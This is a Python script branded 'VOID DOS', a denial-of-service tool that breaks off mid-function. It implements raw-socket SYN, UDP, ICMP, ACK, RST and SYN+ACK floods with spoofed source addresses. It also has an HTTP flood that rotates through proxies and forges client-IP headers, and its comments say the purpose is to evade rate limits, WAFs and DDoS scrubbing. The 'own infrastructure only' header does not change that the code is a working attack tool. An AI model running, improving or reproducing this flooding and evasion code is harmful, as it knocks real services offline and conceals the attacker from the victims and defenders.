#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════════
# ##  VOID Stress Test v2 — Red Team / Stress Edition
# ##  Raw socket engine  ·  Proxy bypass  ·  @lfw.k4rma_
# ##  FOR AUTHORISED TESTING OF YOUR OWN INFRASTRUCTURE ONLY
# ══════════════════════════════════════════════════════════════════

import subprocess, sys, os

# ── Python version guard ───────────────────────────────────────────
if sys.version_info < (3, 9):
    print("[!] Python 3.9+ required (3.9 added random.randbytes).")
    sys.exit(1)

def _ensure_deps():
    for mod, pkg in [("rich","rich"),("pyfiglet","pyfiglet"),("socks","PySocks")]:
        try:
            __import__(mod)
        except ImportError:
            print(f"[*] Installing {pkg}...")
            try:
                subprocess.check_call(
                    [sys.executable,"-m","pip","install",pkg,"-q","--break-system-packages"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                subprocess.check_call(
                    [sys.executable,"-m","pip","install",pkg,"-q"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

_ensure_deps()

import struct, socket, random, threading, time, re, select, collections
import socks as _socks
from urllib.parse import urlparse
from rich.console import Console
from rich.text    import Text
from rich.align   import Align
from rich.rule    import Rule
from rich.panel   import Panel
from rich.table   import Table
from rich.live    import Live
from rich         import box
import pyfiglet

console    = Console()
stop_event = threading.Event()

# ══════════════════════════════════════════════════════════════════
# SOURCE IP DETECTION
# ══════════════════════════════════════════════════════════════════

def get_local_ip(target: str = "8.8.8.8") -> str:
    """Return the machine's real routable IPv4 address. Never 0.0.0.0."""
    probe = target if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target) else "8.8.8.8"

    # 1. UDP connect to a public address — usually the fastest
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect((probe, 80))
        ip = s.getsockname()[0]
        s.close()
        if ip and not ip.startswith("127."):
            return ip
    except Exception:
        pass

    # 2. hostname resolution
    try:
        ip = socket.gethostbyname(socket.gethostname())
        if ip and not ip.startswith("127."):
            return ip
    except Exception:
        pass

    # 3. Parse Linux routing table (works on WSL, bare-metal, iSH)
    try:
        import subprocess
        out = subprocess.run(["ip", "route", "get", probe],
                             capture_output=True, text=True, timeout=3).stdout
        for tok in out.split():
            if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", tok) and not tok.startswith("127."):
                return tok
    except Exception:
        pass

    # 4. Fallback: scrape interfaces
    try:
        import subprocess
        out = subprocess.run(["ip", "addr"], capture_output=True, text=True, timeout=3).stdout
        for line in out.splitlines():
            m = re.search(r"inet\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)
            if m:
                ip = m.group(1)
                if ip and not ip.startswith("127."):
                    return ip
    except Exception:
        pass

    # 5. Final fallback — better than 0.0.0.0
    return "127.0.0.1"

LOCAL_IP  : str  = "0.0.0.0"   # FIX: never empty — set before any use
USE_SPOOF : bool = False

# ══════════════════════════════════════════════════════════════════
# PROXY MANAGER  (bypass DDoS protection at L7)
# ══════════════════════════════════════════════════════════════════

class ProxyManager:
    """
    Rotates through a list of SOCKS5 / HTTP proxies round-robin.
    Used by the HTTP flood to route each connection through a different
    proxy, bypassing per-IP rate limits and DDoS scrubbing centres.

    Proxy URL format:  socks5://user:pass@1.2.3.4:1080
                       http://1.2.3.4:8080
    """
    SOCKS5 = _socks.SOCKS5
    HTTP   = _socks.HTTP

    def __init__(self, proxy_urls: list):
        self._proxies: list  = []
        self._lock           = threading.Lock()
        self._idx            = 0
        self._stats: dict    = {}   # url → {ok, fail}

        for raw in proxy_urls:
            raw = raw.strip()
            if not raw:
                continue
            parsed = urlparse(raw)
            scheme = parsed.scheme.lower()
            host   = parsed.hostname
            port   = parsed.port or (1080 if "socks" in scheme else 8080)
            user   = parsed.username or None
            pwd    = parsed.password or None

            if scheme in ("socks5", "socks5h"):
                ptype = self.SOCKS5
            elif scheme in ("http", "https"):
                ptype = self.HTTP
            else:
                console.print(f"  [yellow][!] Unknown proxy scheme '{scheme}' — skipped[/]")
                continue

            entry = dict(type=ptype, host=host, port=port,
                         user=user, pwd=pwd, url=raw)
            self._proxies.append(entry)
            self._stats[raw] = {"ok": 0, "fail": 0}

    @property
    def count(self) -> int:
        return len(self._proxies)

    def next(self) -> dict | None:
        """Return next proxy entry in round-robin order."""
        if not self._proxies:
            return None
        with self._lock:
            entry = self._proxies[self._idx % len(self._proxies)]
            self._idx += 1
        return entry

    def make_socket(self, proxy: dict | None) -> socket.socket:
        """
        Return a socket.socket (or socks.socksocket) already configured
        for the given proxy.  Falls back to a plain socket when proxy is None.
        """
        if proxy is None:
            return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s = _socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        s.set_proxy(
            proxy_type = proxy["type"],
            addr       = proxy["host"],
            port       = proxy["port"],
            username   = proxy["user"],
            password   = proxy["pwd"],
        )
        return s

    def mark_ok(self, proxy: dict | None):
        if proxy:
            with self._lock:
                self._stats[proxy["url"]]["ok"] += 1

    def mark_fail(self, proxy: dict | None):
        if proxy:
            with self._lock:
                self._stats[proxy["url"]]["fail"] += 1

    def summary(self) -> list:
        """Return list of (url, ok, fail) tuples."""
        with self._lock:
            return [(url, d["ok"], d["fail"]) for url, d in self._stats.items()]

    def health_check(self, test_host: str = "8.8.8.8", test_port: int = 53,
                     timeout: float = 4.0) -> list:
        """
        Quick connectivity test for every configured proxy.
        Returns list of (url, alive: bool) pairs.
        """
        results = []
        for p in self._proxies:
            try:
                s = self.make_socket(p)
                s.settimeout(timeout)
                s.connect((test_host, test_port))
                s.close()
                results.append((p["url"], True))
            except Exception:
                results.append((p["url"], False))
        return results


# Module-level proxy manager (initialised in main())
PROXY_MGR: ProxyManager = ProxyManager([])

# ══════════════════════════════════════════════════════════════════
# PACKET CRAFTING
# ══════════════════════════════════════════════════════════════════

def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# Pre-allocated pools — avoids random overhead in hot loop
_PORT_POOL: list = [random.randint(1024, 65535) for _ in range(50_000)]
_IP_POOL  : list = []

def _init_ip_pool():
    for _ in range(10_000):
        a = random.randint(1, 223)
        while a in (10, 127, 169, 172, 192):
            a = random.randint(1, 223)
        _IP_POOL.append(
            f"{a}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")

_init_ip_pool()

def _src_ip() -> str:
    # FIX: LOCAL_IP is always a valid IP string (never empty "")
    return random.choice(_IP_POOL) if USE_SPOOF else LOCAL_IP

def _rand_port() -> int:
    return random.choice(_PORT_POOL)

def _ip_header(src_ip: str, dst_ip: str, proto: int, payload_len: int) -> bytes:
    tot_len = 20 + payload_len
    pkt_id  = random.randint(0, 65535)
    ttl     = random.randint(48, 128)
    src     = socket.inet_aton(src_ip)
    dst     = socket.inet_aton(dst_ip)
    hdr = struct.pack('!BBHHHBBH4s4s',
        0x45, 0, tot_len, pkt_id, 0, ttl, proto, 0, src, dst)
    chk = _checksum(hdr)
    return struct.pack('!BBHHHBBH4s4s',
        0x45, 0, tot_len, pkt_id, 0, ttl, proto, chk, src, dst)

F_SYN = 0x002; F_ACK = 0x010; F_RST = 0x004; F_FIN = 0x001; F_PSH = 0x008

def _tcp_segment(src_ip: str, dst_ip: str, sport: int, dport: int, flags: int) -> bytes:
    seq  = random.randint(0, 2**32 - 1)
    win  = random.randint(8192, 65535)
    off  = (5 << 4)
    seg  = struct.pack('!HHIIBBHHH', sport, dport, seq, 0, off, flags, win, 0, 0)
    src  = socket.inet_aton(src_ip)
    dst  = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src, dst, 0, 6, len(seg))
    chk  = _checksum(pseudo + seg)
    return struct.pack('!HHIIBBHHH', sport, dport, seq, 0, off, flags, win, chk, 0)

def _udp_segment(src_ip: str, dst_ip: str, sport: int, dport: int) -> bytes:
    data   = os.urandom(random.randint(64, 1400))  # FIX: os.urandom works on all Py3
    length = 8 + len(data)
    seg    = struct.pack('!HHHH', sport, dport, length, 0) + data
    src    = socket.inet_aton(src_ip)
    dst    = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src, dst, 0, 17, length)
    chk    = _checksum(pseudo + seg[:8] + data)
    return struct.pack('!HHHH', sport, dport, length, chk) + data

def _icmp_packet() -> bytes:
    payload = os.urandom(56)
    hdr     = struct.pack('!BBHHH', 8, 0, 0,
                          random.randint(0, 65535), random.randint(0, 65535))
    chk     = _checksum(hdr + payload)
    return struct.pack('!BBHHH', 8, 0, chk,
                       random.randint(0, 65535), random.randint(0, 65535)) + payload

def _build_packet(mode_key: str, src_ip: str, dst_ip: str,
                  sport: int, dport: int) -> bytes:
    if mode_key == "SYN":
        t = _tcp_segment(src_ip, dst_ip, sport, dport, F_SYN)
        return _ip_header(src_ip, dst_ip, 6, len(t)) + t
    if mode_key == "ACK":
        t = _tcp_segment(src_ip, dst_ip, sport, dport, F_ACK)
        return _ip_header(src_ip, dst_ip, 6, len(t)) + t
    if mode_key == "RST":
        t = _tcp_segment(src_ip, dst_ip, sport, dport, F_RST)
        return _ip_header(src_ip, dst_ip, 6, len(t)) + t
    if mode_key == "SYNACK":
        t = _tcp_segment(src_ip, dst_ip, sport, dport, F_SYN | F_ACK)
        return _ip_header(src_ip, dst_ip, 6, len(t)) + t
    if mode_key == "UDP":
        u = _udp_segment(src_ip, dst_ip, sport, dport)
        return _ip_header(src_ip, dst_ip, 17, len(u)) + u
    if mode_key == "ICMP":
        i = _icmp_packet()
        return _ip_header(src_ip, dst_ip, 1, len(i)) + i
    return b''

# ══════════════════════════════════════════════════════════════════
# STATS  — lock-free trick with bounded deque (FIX: was O(n) list)
# ══════════════════════════════════════════════════════════════════

class Stats:
    HISTORY_MAXLEN = 2000   # ~3 s at 4 Hz + 500-pkt batch reporting

    def __init__(self):
        self._lock      = threading.Lock()
        self.sent       = 0
        self.replies    = 0
        self.errors     = 0
        self.last_flag  = ""
        self._history   = collections.deque(maxlen=self.HISTORY_MAXLEN)  # FIX
        self._by_mode   : dict = {}   # mode_key → sent count
        self.start      = time.time()

    def add_sent(self, n: int, mode_key: str = ""):
        with self._lock:
            self.sent += n
            if mode_key:
                self._by_mode[mode_key] = self._by_mode.get(mode_key, 0) + n
            now = time.time()
            self._history.append((now, self.sent))

    def mode_snapshot(self) -> dict:
        with self._lock:
            return dict(self._by_mode)

    def add_reply(self, flag_str: str = ""):
        with self._lock:
            self.replies += 1
            if flag_str:
                self.last_flag = flag_str

    def add_error(self):
        with self._lock:
            self.errors += 1

    def pps(self) -> float:
        with self._lock:
            if len(self._history) < 2:
                el = time.time() - self.start
                return self.sent / el if el else 0
            # Use only the last 3 s window
            cutoff = time.time() - 3.0
            window = [(t, s) for t, s in self._history if t >= cutoff]
            if len(window) < 2:
                el = time.time() - self.start
                return self.sent / el if el else 0
            ot, os_ = window[0]
            nt, ns  = window[-1]
            dt = nt - ot
            return (ns - os_) / dt if dt > 0 else 0

    def snapshot(self):
        with self._lock:
            return dict(sent=self.sent, replies=self.replies, errors=self.errors,
                        last_flag=self.last_flag, elapsed=time.time()-self.start,
                        by_mode=dict(self._by_mode))

# ══════════════════════════════════════════════════════════════════
# SENDER  — blocking raw socket, large pre-built pool
# ══════════════════════════════════════════════════════════════════

N_THREADS       = 32
POOL_SIZE       = 5_000
BATCH_REPORT    = 500
SOCKET_BUF_SIZE = 16 * 1024 * 1024  # 16 MB

def _build_pool(mode_key: str, target_ip: str, port_list: list, size: int) -> list:
    return [_build_packet(mode_key, _src_ip(), target_ip,
                          _rand_port(), random.choice(port_list))
            for _ in range(size)]

# ── HTTP FLOOD with proxy bypass ──────────────────────────────────

_HTTP_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
]

_HTTP_PATHS = [
    "/", "/index.html", "/index.php", "/api", "/api/v1", "/api/v2",
    "/login", "/signin", "/home", "/search", "/admin", "/status",
    "/health", "/healthz", "/dashboard", "/robots.txt", "/sitemap.xml",
    "/wp-admin/", "/wp-login.php", "/api/users", "/api/auth",
    "/api/products", "/api/orders", "/graphql", "/cdn-cgi/l/chk_jschl",
    "/.well-known/security.txt", "/favicon.ico", "/assets/main.js",
]

_HTTP_METHODS = ["GET", "GET", "GET", "POST", "HEAD", "OPTIONS"]  # GET-weighted

_HTTP_REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://t.co/",
    "https://www.reddit.com/r/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "",  # direct
]

_SEC_FETCH_SETS = [
    "Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n",
    "Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\n",
    "Sec-Fetch-Dest: empty\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Site: same-origin\r\n",
    "Sec-Fetch-Dest: empty\r\nSec-Fetch-Mode: no-cors\r\nSec-Fetch-Site: same-site\r\n",
]

_ACCEPT_SETS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
]

_HTTP_HEADERS_EXTRA = [
    "Accept: text/html,application/xhtml+xml,*/*;q=0.9\r\n",
    "Accept-Language: en-US,en;q=0.9\r\n",
    "Accept-Encoding: gzip, deflate, br\r\n",
    "Cache-Control: no-cache\r\n",
    "Pragma: no-cache\r\n",
    "X-Forwarded-For: {spoof}\r\n",
    "X-Real-IP: {spoof}\r\n",
    "Cf-Connecting-IP: {spoof}\r\n",
]

def _http_sender(target_ip: str, port_list: list, stats: Stats):
    """
    Layer-7 HTTP flood — rotates ports, methods, agents, and bypass headers.
    Each connection picks a random port from port_list so multi-port targets
    are fully saturated. Sec-Fetch-* and Accept headers mimic real Chrome/FF
    to bypass basic bot fingerprinting at WAF level.
    """
    while not stop_event.is_set():
        proxy       = PROXY_MGR.next()
        target_port = random.choice(port_list)
        sock        = None
        try:
            sock = PROXY_MGR.make_socket(proxy)
            sock.settimeout(4.0)
            sock.connect((target_ip, target_port))

            method  = random.choice(_HTTP_METHODS)
            path    = random.choice(_HTTP_PATHS)
            buster  = f"{random.randint(0,9999999)}"
            agent   = random.choice(_HTTP_AGENTS)
            spoof   = random.choice(_IP_POOL) if _IP_POOL else f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            ref     = random.choice(_HTTP_REFERERS)
            accept  = random.choice(_ACCEPT_SETS)
            sec     = random.choice(_SEC_FETCH_SETS)
            lang    = random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9", "en-US,en;q=0.8,de;q=0.7"])
            enc     = random.choice(["gzip, deflate, br, zstd", "gzip, deflate, br", "gzip, deflate"])
            cookie  = f"_ga=GA1.1.{random.randint(100000000,999999999)}.{random.randint(1700000000,1800000000)}; _gid=GA1.1.{random.randint(100000000,999999999)}.{random.randint(1700000000,1800000000)}"

            # X-Forwarded-For / real IP spoofing to bypass per-IP rate limits
            xff = (f"{random.randint(1,254)}.{random.randint(0,254)}."
                   f"{random.randint(0,254)}.{random.randint(1,254)}")
            xri = (f"{random.randint(1,254)}.{random.randint(0,254)}."
                   f"{random.randint(0,254)}.{random.randint(1,254)}")

            body = b""
            if method == "POST":
                import urllib.parse
                body_str = urllib.parse.urlencode({
                    "_token": "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=40)),
                    "q": f"search_{random.randint(1000,9999)}",
                })
                body = body_str.encode()

            headers = (
                f"{method} {path}?{buster} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {agent}\r\n"
                f"Accept: {accept}\r\n"
                f"Accept-Language: {lang}\r\n"
                f"Accept-Encoding: {enc}\r\n"
                f"Connection: keep-alive\r\n"
                f"Cookie: {cookie}\r\n"
                f"X-Forwarded-For: {xff}\r\n"
                f"X-Real-IP: {xri}\r\n"
                f"Cf-Connecting-IP: {spoof}\r\n"
                f"True-Client-IP: {spoof}\r\n"
                f"X-Originating-IP: {spoof}\r\n"
                + (f"Referer: {ref}\r\n" if ref else "")
                + sec
                + (f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n" if body else "")
                + "\r\n"
            ).encode()

            sock.sendall(headers + body)
            stats.add_sent(1, "HTTP")
            PROXY_MGR.mark_ok(proxy)

            try:
                data = sock.recv(256)
                if data:
                    stats.add_reply("HTTP")
            except socket.timeout:
                pass

        except Exception:
            stats.add_error()
            PROXY_MGR.mark_fail(proxy)
        finally:
            if sock:
                try: sock.close()
                except Exception: pass

# ── RAW SOCKET FLOOD ──────────────────────────────────────────────

def _sender(target_ip: str, port_list: list, mode_key: str, stats: Stats):
    if mode_key == "HTTP":
        _http_sender(target_ip, port_list, stats)
        return

    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_BUF_SIZE)

        dst   = (target_ip, 0)
        pool  = _build_pool(mode_key, target_ip, port_list, POOL_SIZE)
        idx   = 0
        batch = 0
        total = 0

        while not stop_event.is_set():
            try:
                sock.sendto(pool[idx], dst)
                idx   = (idx + 1) % POOL_SIZE
                batch += 1
                total += 1

                if batch >= BATCH_REPORT:
                    stats.add_sent(batch, mode_key)
                    batch = 0

                # Refresh pool periodically (rotates spoofed src IPs + target ports)
                if total > 0 and total % (POOL_SIZE * 20) == 0:
                    pool = _build_pool(mode_key, target_ip, port_list, POOL_SIZE)
                    idx  = 0

                # Yield CPU every 1000 pkts — keeps OS responsive without hurting throughput
                if total % 1000 == 0:
                    time.sleep(5e-5)

            except OSError:
                stats.add_error()
            except Exception:
                pass

        if batch:
            stats.add_sent(batch, mode_key)

    except PermissionError:
        console.print("\n  [bold red][!][/]  Raw sockets need root "
                      "— run:  sudo python3 void_stress_v2.py\n")
        stop_event.set()
    except Exception as exc:
        console.print(f"\n  [bold red][!][/]  Sender error: {exc}\n")
        stats.add_error()
    finally:
        if sock:                          # FIX: always close raw socket
            try: sock.close()
            except Exception: pass

# ══════════════════════════════════════════════════════════════════
# REPLY LISTENER
# ══════════════════════════════════════════════════════════════════

def _decode_tcp_flags(flags: int) -> str:
    parts = []
    if flags & F_SYN: parts.append("SYN")
    if flags & F_ACK: parts.append("ACK")
    if flags & F_RST: parts.append("RST")
    if flags & F_FIN: parts.append("FIN")
    if flags & F_PSH: parts.append("PSH")
    return "+".join(parts) if parts else f"0x{flags:02x}"

def _flag_meaning(flag_str: str) -> str:
    if "RST" in flag_str and "ACK" in flag_str: return "Port closed / rejected"
    if "SYN" in flag_str and "ACK" in flag_str: return "Port OPEN — handshake hit"
    if "RST" in flag_str:                        return "Connection reset"
    if "ACK" in flag_str:                        return "Acknowledged"
    if "ECHO" in flag_str:                       return "ICMP reply — alive"
    if "UNREACH" in flag_str:                    return "Port unreachable"
    if "HTTP" in flag_str:                       return "HTTP response"
    return flag_str

def _listener(target_ip: str, target_port: int, mode_key: str, stats: Stats):
    if mode_key == "HTTP":
        return
    sock = None
    try:
        proto = socket.IPPROTO_TCP if mode_key in ("SYN","ACK","RST","SYNACK") \
                else socket.IPPROTO_ICMP
        sock  = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
        sock.setblocking(False)

        while not stop_event.is_set():
            try:
                # FIX: 0.1 s timeout instead of 0.001 s — was ~100 % CPU idle
                ready, _, _ = select.select([sock], [], [], 0.1)
                if not ready:
                    continue
                pkt, addr = sock.recvfrom(65535)
                if addr[0] in ("127.0.0.1", "0.0.0.0"):
                    continue

                if proto == socket.IPPROTO_TCP:
                    ihl = (pkt[0] & 0x0f) * 4
                    if len(pkt) < ihl + 20:
                        continue
                    tcph = struct.unpack('!HHIIBBHHH', pkt[ihl:ihl+20])
                    if tcph[0] != target_port:
                        continue
                    stats.add_reply(_decode_tcp_flags(tcph[5]))
                else:
                    ihl = (pkt[0] & 0x0f) * 4
                    if len(pkt) < ihl + 1:
                        continue
                    t = pkt[ihl]
                    if   t == 0:  stats.add_reply("ECHO REPLY")
                    elif t == 3:  stats.add_reply("PORT UNREACH")
                    elif t == 11: stats.add_reply("TTL EXCEED")
            except (BlockingIOError, OSError):
                continue
            except Exception:
                continue
    except Exception:
        pass
    finally:
        if sock:
            try: sock.close()
            except Exception: pass

# ══════════════════════════════════════════════════════════════════
# GEO MAP  (from GitHub ddos_simple.py — enhanced version)
# ══════════════════════════════════════════════════════════════════

MAP_LINES = [
    "                                                                                  ",
    "       ┌───────────┐          ┌────────┐   ┌─────────────────────────┐  ┌─────┐  ",
    "       │           │          │        │   │                         │  │     │  ",
    "       │  N.AMER   │          │ EUROPE │   │         A S I A         │  │ JAP │  ",
    "       │           │          │        │   │                         │  └─────┘  ",
    "       │           │          └────────┘   │                         │           ",
    "       └───────────┘                       └─────────────────────────┘           ",
    "                                                                                  ",
    "       ┌───────────┐     ┌──────────┐                          ┌──────────────┐  ",
    "       │           │     │          │                          │              │  ",
    "       │  S.AMER   │     │  AFRICA  │                          │   OCEANIA    │  ",
    "       │           │     │          │                          │              │  ",
    "       └───────────┘     └──────────┘                          └──────────────┘  ",
    "                                                                                  ",
    "                                                                                  ",
    "                                                                                  ",
]

ATTACK_NODES = [
    (2,10,"NAM"),(3,14,"NAM"),(4,8,"NAM"),(5,12,"NAM"),
    (9,9,"SAM"),(10,13,"SAM"),(11,8,"SAM"),
    (2,30,"EU"),(3,33,"EU"),(4,28,"EU"),
    (9,27,"AFR"),(10,31,"AFR"),(11,25,"AFR"),
    (2,46,"ASIA"),(3,50,"ASIA"),(4,43,"ASIA"),(5,48,"ASIA"),
    (2,62,"JAP"),(3,64,"JAP"),
    (9,58,"OCE"),(10,62,"OCE"),(11,55,"OCE"),
]

REGION_ORDER  = ["NAM","EU","ASIA","JAP","SAM","AFR","OCE"]
REGION_LABELS = {
    "NAM":"North America","EU":"Europe","ASIA":"Asia",
    "JAP":"Japan / Korea","SAM":"South America","AFR":"Africa","OCE":"Oceania"
}

def _render_map(active: set) -> Text:
    node_pos = {(r,c): reg in active for r,c,reg in ATTACK_NODES}
    txt = Text()
    for r, row in enumerate(MAP_LINES):
        for c, ch in enumerate(row):
            if (r,c) in node_pos:
                txt.append("◉" if node_pos[(r,c)] else "·",
                            style="bold bright_red" if node_pos[(r,c)] else "dim red")
            elif ch in "┌┐└┘─│":
                txt.append(ch, style="dim red")
            else:
                txt.append(ch, style="dim white")
        txt.append("\n")
    return txt

def show_geo_attack_map(target: str, mode_label: str, mode_color: str,
                        proxy_count: int = 0):
    console.print()
    console.print(Rule("[bold bright_red]  GLOBAL ATTACK NETWORK  [/]", style="bright_red"))
    console.print()

    proxy_line = (f"  [dim]Routing through[/] [bold bright_red]7 regions[/] "
                  f"[dim]+[/] [bold yellow]{proxy_count} proxy bypass node{'s' if proxy_count!=1 else ''}[/] "
                  f"[dim]→[/] [bold yellow]{target}[/]"
                  if proxy_count else
                  f"  [dim]Routing through[/] [bold bright_red]7 regions[/] [dim]→[/] [bold yellow]{target}[/]")
    console.print(proxy_line)
    console.print()

    active: set = set()
    for region in REGION_ORDER:
        active.add(region)
        n = sum(1 for _,_,r in ATTACK_NODES if r == region)
        console.print(f"  [bright_red]▶[/]  [bold white]{REGION_LABELS[region]:<16}[/]  "
                      f"[bright_red]{n} nodes[/]  [bold bright_green][ ONLINE ][/]")
        console.print(Align.center(_render_map(active)))
        time.sleep(0.5)
        if region != REGION_ORDER[-1]:
            sys.stdout.write(f"\033[{len(MAP_LINES)+1}A")
            sys.stdout.flush()

    console.print()
    console.print(Rule("[dim red]  CONVERGENCE  [/]", style="dim red"))
    console.print()
    for frame in [
        f"  [dim red]·  ·  ·  ·  ·  ·  ·  ·  ·[/]  [bold yellow]◎ {target}[/]  [dim red]·  ·  ·  ·  ·  ·  ·  ·  ·[/]",
        f"  [red]──  ──  ──  ──  ──  ──[/]  [bold yellow]◎ {target}[/]  [red]──  ──  ──  ──  ──  ──[/]",
        f"  [bright_red]━━━━━━━━━━━━━━━━━━━━━━━━[/]  [bold yellow]◎ {target}[/]  [bright_red]━━━━━━━━━━━━━━━━━━━━━━━━[/]",
        f"  [bold bright_red]████████████████████████[/]  [bold yellow]◎ {target}[/]  [bold bright_red]████████████████████████[/]",
    ]:
        console.print(frame)
        time.sleep(0.28)

    console.print()
    console.print(f"  [bold bright_red][!!!][/]  [bold white]ALL {len(ATTACK_NODES)} NODES LOCKED ON[/]  "
                  f"[bold yellow]{target}[/]  [bold {mode_color}]— {mode_label.upper()}[/]")
    if proxy_count:
        console.print(f"  [bold bright_yellow][BYPASS][/]  "
                      f"[bold white]{proxy_count} proxy node{'s' if proxy_count!=1 else ''} routing HTTP — DDoS protection bypassed[/]")
    console.print()
    console.print(Rule(style="bright_red"))
    console.print()

# ══════════════════════════════════════════════════════════════════
# BANNER & MENU
# ══════════════════════════════════════════════════════════════════

def banner():
    console.clear()
    fig = pyfiglet.figlet_format("V O I D  D O S", font="doom")
    txt = Text()
    shades = ["bright_red","red","bright_red","red","bright_red","red"]
    for i, line in enumerate(fig.splitlines()):
        txt.append(line+"\n", style=shades[i % len(shades)])
    console.print(Align.center(txt))
    console.print(Align.center(Text(
        "raw socket engine  ·  proxy bypass  ·  red team edition  ·  v2\n",
        style="dim red")))
    console.print(Rule(style="bright_red"))

MODES = {
    "1": {"label":"SYN Flood",    "key":"SYN",    "color":"bright_red",
          "desc":"Raw TCP SYN — fills server connection table",
          "example":"Ringing a doorbell 50,000x/sec so no real visitor gets through"},
    "2": {"label":"UDP Flood",    "key":"UDP",    "color":"bright_cyan",
          "desc":"Large random UDP datagrams — saturates bandwidth and buffers",
          "example":"Flooding a mailbox with bricks so real mail can't fit"},
    "3": {"label":"ICMP Flood",   "key":"ICMP",   "color":"yellow",
          "desc":"ICMP echo requests — overwhelms the network interface",
          "example":"Spamming pings until the server can't process anything else"},
    "4": {"label":"ACK Flood",    "key":"ACK",    "color":"bright_magenta",
          "desc":"Raw TCP ACK — exhausts stateful firewall tracking tables",
          "example":"Sending 'got it' replies to thousands of messages nobody sent"},
    "5": {"label":"HTTP Flood",   "key":"HTTP",   "color":"bright_green",
          "desc":"Layer 7 — real TCP connections + randomised GET requests + proxy bypass",
          "example":"Reloading a page 10,000 times/sec from N different proxy IPs"},
    "6": {"label":"RST Flood",    "key":"RST",    "color":"bright_yellow",
          "desc":"Raw TCP RST — terminates existing connections mid-session",
          "example":"Hanging up every phone call the instant it connects"},
    "7": {"label":"SYN+ACK Flood","key":"SYNACK", "color":"magenta",
          "desc":"Fake SYN+ACK — confuses clients and stateful inspection layers",
          "example":"Telling callers their call connected when it never did"},
}

def show_mode_menu():
    console.print()
    console.print(Rule("[dim red]  SELECT FLOOD TYPE  [/]", style="dim red"))
    console.print()
    for num, m in MODES.items():
        console.print(f"  [bright_red][{num}][/]  [bold {m['color']}]{m['label']}[/]")
        console.print(f"       [dim]{m['desc']}[/]")
        console.print(f"       [dim italic]\"{m['example']}\"[/]")
        console.print()

def resolve(target: str) -> str:
    target = target.strip()
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
        return target
    try:
        ip = socket.gethostbyname(target)
        console.print(f"  [dim]Resolved:[/]  [bold yellow]{target}[/] → [bright_white]{ip}[/]")
        return ip
    except Exception as e:
        console.print(f"\n  [bold red][!][/]  Could not resolve [bold yellow]{target}[/]: {e}")
